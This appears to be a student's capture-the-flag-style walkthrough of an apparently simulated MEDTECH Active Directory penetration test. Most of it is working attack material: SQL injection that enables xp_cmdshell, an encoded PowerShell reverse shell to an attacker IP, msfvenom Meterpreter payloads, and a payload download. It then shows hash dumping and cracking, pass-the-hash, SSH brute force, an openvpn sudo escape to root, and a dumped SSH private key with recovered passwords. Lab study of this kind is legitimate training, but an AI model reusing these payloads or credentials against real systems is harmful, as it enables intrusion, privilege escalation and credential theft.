@@ -1,0 +1,716 @@
+Challenge Lab 1: MEDTECH: You have been tasked to conduct a penetration test for MEDTECH, a recently formed IoT healthcare startup. Your objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -Pn -sT 192.168.176.120-122                                           
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 08:46 CET
+Nmap scan report for 192.168.176.120
+Host is up (0.037s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 192.168.176.121
+Host is up (0.037s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.176.122
+Host is up (0.036s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 3 IP addresses (3 hosts up) scanned in 11.72 seconds
+
+The authentication form in .121, the username field have SQL injection. I noticed by entering ' sign
+
+#remember to enable xp_cmd shell first
+
+admin' UNION SELECT is_srvrolemember('sysadmin'),2--+
+
+Result of above query should be 1. If it is, let’s do further.
+
+admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
+admin' UNION SELECT 1,2; RECONFIGURE--+
+admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
+admin' UNION SELECT 1,2; RECONFIGURE--+
+
+#then execute this on the username field                                                                       
+
+'; exec master..xp_cmdshell 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== '--
+
+#Then got a reverse shell
+
+──(kali㉿kali)-[~/medtech]
+└─$ nc -nvlp 4444                           
+listening on [any] 4444 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.176.121] 55071
+whoami
+nt service\mssql$sqlexpress
+PS C:\Windows\system32> cd tools
+PS C:\Windows\system32> cd ..
+PS C:\Windows> cd ..
+PS C:\> cd tools
+PS C:\tools> ls
+PS C:\tools> hostname
+WEB02
+PS C:\tools> 
+
+I chech the privileges for my user and noticed that I can used printspoofer from Metasploit and get privileged access
+
+PS C:\tools> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\tools> 
+
+I abusesed the SeImpersonatePrivilege
+#generated a met.exe file to transfer my reverse shell to Metasploit meterpreter reverse shell multi handler
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.167 LPORT=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+
+#Stated a meterpreter shell, transfered the met.exe file and executed the met.exe file and got a 
+
+iwr -uri http://192.168.45.167:8000/met.exe -Outfile met.exe
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ sudo msfconsole -q
+[sudo] password for kali: 
+[*] Starting persistent handler(s)...
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.45.167
+LHOST => 192.168.45.167
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.45.167:443 
+msf6 exploit(multi/handler) > [*] Sending stage (201798 bytes) to 192.168.176.121
+[*] Meterpreter session 1 opened (192.168.45.167:443 -> 192.168.176.121:53024) at 2024-11-14 09:03:46 +0100
+
+msf6 exploit(multi/handler) > 
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT Service\MSSQL$SQLEXPRESS
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+Ipconfig shows that the server is connected to an internal network IPv4 Address : 172.16.176.254, IPv4 Netmask : 255.255.255.0
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  2
+============
+Name         : vmxnet3 Ethernet Adapter
+Hardware MAC : 00:50:56:9e:11:be
+MTU          : 1500
+IPv4 Address : 192.168.176.121
+IPv4 Netmask : 255.255.255.0
+
+
+Interface  5
+============
+Name         : vmxnet3 Ethernet Adapter #2
+Hardware MAC : 00:50:56:9e:bf:bd
+MTU          : 1500
+IPv4 Address : 172.16.176.254
+IPv4 Netmask : 255.255.255.0
+
+meterpreter > 
+
+enumerating further with PowerView indicated other information like user and computers
+
+#domain user
+Yoshi
+wario
+mario
+peach
+joe
+leon
+offsec
+administrator
+
+#domain computers,  also used nsookup to add their IPs
+
+PS C:\Users\Administrator> Get-NetComputer | select operatingsystem,dnshostname
+
+operatingsystem              dnshostname          
+---------------              -----------          
+Windows Server 2022 Standard DC01.medtech.com             172.16.176.10
+Windows Server 2022 Standard FILES02.medtech.com          172.16.176.11
+Windows Server 2022 Standard DEV04.medtech.com            172.16.176.12
+Windows 11 Enterprise        CLIENT01.medtech.com         172.16.176.82
+Windows Server 2022 Standard PROD01.medtech.com           172.16.176.13
+Windows 11 Enterprise        CLIENT02.medtech.com         172.16.176.83
+Windows Server 2022 Standard WEB02.dmz.medtech.com        172.16.176.254
+
+Using sharphound.ps1, I extracted the domain information and analysed it on a Bloodhound. I noticed Joe is currently an active user, same to Leon who is also a domain admin.
+
+#enumeratin further to capture the login sessions of this user and capture their ntlm harshes
+
+More enumeration with mimikatz revealed joe hash ntlm
+
+08d7a47a6f9f66b97b1bae4178747494
+
+I craced it with hashcat
+
+sudo hashcat -m 1000 joe.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+The cleartext is Flowers1
+
+#We have to pivot into the internal network using proxychains to see if we can access the machines in the internal network
+
+
+C:\Users\Administrator>exit
+exit
+meterpreter > bg
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+
+[*] Running module against WEB02
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.176.0/255.255.255.0 from host's routing table.
+[+] Route added to subnet 192.168.176.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 1.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) >
+
+I started by enumerating shares with the earlier found credentials
+
+──(kali㉿kali)-[~]
+└─$ proxychains -q crackmapexec smb 172.16.176.10 172.16.176.11 172.16.176.12 172.16.176.13 172.16.176.82 172.16.176.83 172.16.176.254 -u joe -d medtech.com -p "Flowers1" --shares  
+/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence '\ '
+  """,
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
+  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
+/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
+  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
+  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+SMB         172.16.176.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.176.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.176.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.176.254  445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.176.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.176.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.176.12   445    DEV04            [+] medtech.com\joe:Flowers1 
+SMB         172.16.176.12   445    DEV04            [+] Enumerated shares
+SMB         172.16.176.12   445    DEV04            Share           Permissions     Remark
+SMB         172.16.176.12   445    DEV04            -----           -----------     ------
+SMB         172.16.176.12   445    DEV04            ADMIN$                          Remote Admin
+SMB         172.16.176.12   445    DEV04            C$                              Default share
+SMB         172.16.176.12   445    DEV04            IPC$            READ            Remote IPC
+SMB         172.16.176.10   445    DC01             [+] medtech.com\joe:Flowers1 
+SMB         172.16.176.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
+SMB         172.16.176.254  445    WEB02            [+] medtech.com\joe:Flowers1 
+SMB         172.16.176.254  445    WEB02            [+] Enumerated shares
+SMB         172.16.176.254  445    WEB02            Share           Permissions     Remark
+SMB         172.16.176.254  445    WEB02            -----           -----------     ------
+SMB         172.16.176.254  445    WEB02            ADMIN$                          Remote Admin
+SMB         172.16.176.254  445    WEB02            C$                              Default share
+SMB         172.16.176.254  445    WEB02            IPC$            READ            Remote IPC
+SMB         172.16.176.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
+SMB         172.16.176.83   445    CLIENT02         [+] Enumerated shares
+SMB         172.16.176.83   445    CLIENT02         Share           Permissions     Remark
+SMB         172.16.176.83   445    CLIENT02         -----           -----------     ------
+SMB         172.16.176.83   445    CLIENT02         ADMIN$                          Remote Admin
+SMB         172.16.176.83   445    CLIENT02         C               READ            
+SMB         172.16.176.83   445    CLIENT02         C$                              Default share
+SMB         172.16.176.83   445    CLIENT02         IPC$            READ            Remote IPC
+SMB         172.16.176.83   445    CLIENT02         Windows         READ            
+SMB         172.16.176.10   445    DC01             [+] Enumerated shares
+SMB         172.16.176.10   445    DC01             Share           Permissions     Remark
+SMB         172.16.176.10   445    DC01             -----           -----------     ------
+SMB         172.16.176.10   445    DC01             ADMIN$          READ            Remote Admin
+SMB         172.16.176.10   445    DC01             C$              READ,WRITE      Default share
+SMB         172.16.176.10   445    DC01             IPC$            READ            Remote IPC
+SMB         172.16.176.10   445    DC01             NETLOGON        READ            Logon server share 
+SMB         172.16.176.10   445    DC01             SYSVOL          READ            Logon server share 
+SMB         172.16.176.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
+SMB         172.16.176.82   445    CLIENT01         [+] Enumerated shares
+SMB         172.16.176.82   445    CLIENT01         Share           Permissions     Remark
+SMB         172.16.176.82   445    CLIENT01         -----           -----------     ------
+SMB         172.16.176.82   445    CLIENT01         ADMIN$                          Remote Admin
+SMB         172.16.176.82   445    CLIENT01         C$                              Default share
+SMB         172.16.176.82   445    CLIENT01         IPC$            READ            Remote IPC
+SMB         172.16.176.11   445    FILES02          [+] Enumerated shares
+SMB         172.16.176.11   445    FILES02          Share           Permissions     Remark
+SMB         172.16.176.11   445    FILES02          -----           -----------     ------
+SMB         172.16.176.11   445    FILES02          ADMIN$          READ,WRITE      Remote Admin
+SMB         172.16.176.11   445    FILES02          C               READ,WRITE      
+SMB         172.16.176.11   445    FILES02          C$              READ,WRITE      Default share
+SMB         172.16.176.11   445    FILES02          IPC$            READ            Remote IPC
+SMB         172.16.176.11   445    FILES02          TEMP            READ,WRITE   
+
+
+Output shows that joe has shares access on all the domain internal servers and clients and a local admin on FILES02 server
+Therfore, it met the requiement to execute impacket-wmiexec
+
+We used THS tool to access FILES02 as joe
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ proxychains -q impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 joe@172.16.176.11
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>help
+
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ lget {file}                 - downloads pathname to the current local dir
+ ! {cmd}                    - executes a local shell cmd
+
+we used the help tool to find what we can do with the shell and was able to upload the met.exe file the execute to get the session 2 in our meterpreter shell
+
+C:\>lput met.exe
+[*] Uploading met.exe to C:\met.exe
+C:\>.\met.exe
+
+PS C:\Users> cd administrator.MEDTECH
+cd administrator.MEDTECH
+PS C:\Users\administrator.MEDTECH> whoami
+whoami
+medtech\joe
+PS C:\Users\administrator.MEDTECH> hostname
+hostname
+FILES02
+PS C:\Users\administrator.MEDTECH> 
+
+we used the help tool to find what we can do with the shell and was able to upload the met.exe file the execute to get the session 2 in our meterpreter shell
+
+Dumped items in FILS02 with winpeas
+
+ ================================================================================================= 
+
+          ͹ Ever logged users
+    MEDTECH\Administrator
+    MEDTECH\yoshi
+    MEDTECH\wario
+    MEDTECH\joe
+    FILES02\Administrator
+
+Further enumeration found a file in Joe's document folder. The file based on the name is looks like a backup up file. I dumped the file and used a vscode editor in my kali to manually review the file. where i found the following hashes
+
+abf36048c1cf88f5603381c5128feb8e daisy
+5be63a865b65349851c1f11a067a3068 toad
+fdf36048c1cf88f5630381c5e38feb8e wario Mushroom!
+8e9e1516818ce4e54247e71e71b5f436 goomba
+
+Was able to crack the ntlm hash of mario with hashcat
+
+#Futher enumaration on the external machines
+I used hydra for the vpn server that has only port 22 opened 
+
+──(kali㉿kali)-[~/medtech]
+└─$ sudo hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.240.122
+[sudo] password for kali: 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-15 18:36:34
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.240.122:22/
+[22][ssh] host: 192.168.240.122   login: offsec   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 18:36:50
+                                                                                                                                               
+┌──(kali㉿kali)-[~/medtech]
+└─$ ssh offsec@192.168.240.122                                                       
+The authenticity of host '192.168.240.122 (192.168.240.122)' can't be established.
+ED25519 key fingerprint is SHA256:udGiqS5CWuVlHprkRFQ8yQLekVjoJKlrAiv3UTP6POo.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:7: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.240.122' (ED25519) to the list of known hosts.
+offsec@192.168.240.122's password: 
+Last login: Wed Mar  8 07:42:02 2023
+(lshell) - You are in a limited shell.
+Type '?' or 'help' to get the list of allowed commands
+offsec:~$ whoami
+*** unknown command: whoami
+offsec:~$ hostname
+*** unknown command: hostname
+offsec:~$ ls
+local.txt
+offsec:~$ cat loacl.txt
+cat: loacl.txt: No such file or directory
+offsec:~$ cat local.txt
+f00c77dd87c55f394807d82282cfcb74
+offsec:~$ wget http://192.168.45.167/linpeas.sh
+*** unknown command: wget
+offsec:~$ curl http://192.168.45.167/linpeas.sh
+*** unknown command: curl
+offsec:~$ cd .ssh
+offsec:~/.ssh$ ls
+authorized_keys
+offsec:~/.ssh$ cat authorized_keys 
+offsec:~/.ssh$ cd authorized_keys 
+lshell: authorized_keys: Not a directory
+offsec:~/.ssh$ cat authorized_keys 
+offsec:~/.ssh$ nano authorized_keys
+*** unknown command: nano
+offsec:~/.ssh$ cd ..
+offsec:~$ iwu
+*** unknown command: iwu
+offsec:~$ iwr
+*** unknown command: iwr
+offsec:~$ sudo -l
+[sudo] password for offsec: 
+Matching Defaults entries for offsec on vpn:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User offsec may run the following commands on vpn:
+    (ALL : ALL) /usr/sbin/openvpn
+offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+2024-11-15 18:51:33 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
+2024-11-15 18:51:33 OpenVPN 2.5.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 22 2022
+2024-11-15 18:51:33 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
+2024-11-15 18:51:33 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
+2024-11-15 18:51:33 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
+2024-11-15 18:51:33 /bin/sh -c sh null 1500 1500   init
+# whoami
+root
+# hostname
+vpn
+# 
+
+Running linpeas
+══╣ Possible private SSH keys were found!
+/etc/ssh/ssh_host_dsa_key
+/etc/ssh/ssh_host_rsa_key
+/etc/ssh/ssh_host_ecdsa_key
+/etc/ssh/ssh_host_ed25519_key
+/home/mario/.ssh/id_rsa
+
+-rw------- 1 mario mario 2590 Oct  3  2022 /home/mario/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+pI77A9Emp3E9cAAAAJbWFyaW9AdnBuAQI=
+-----END OPENSSH PRIVATE KEY-----
+
+
+Used Mariano's dumped private key dumped during linpeas enumeration to also access the NTP server
+
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ proxychains -q ssh -i id_rsa mario@172.16.240.14                           
+The authenticity of host '172.16.240.14 (172.16.240.14)' can't be established.
+ED25519 key fingerprint is SHA256:srLYZlCKeyOeH0XD62lR2XSoBZ/uqQ/tVS/YVLY3bF8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.240.14' (ED25519) to the list of known hosts.
+Linux NTP 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Oct  6 11:35:48 2022 from 192.168.118.2
+$ ls
+local.txt
+$ $ 
+$ whoami
+mario
+$ hostname
+NTP
+$ 
+
+
+More smb execution command, it gives an interactive shell than impacket-wmic exec
+
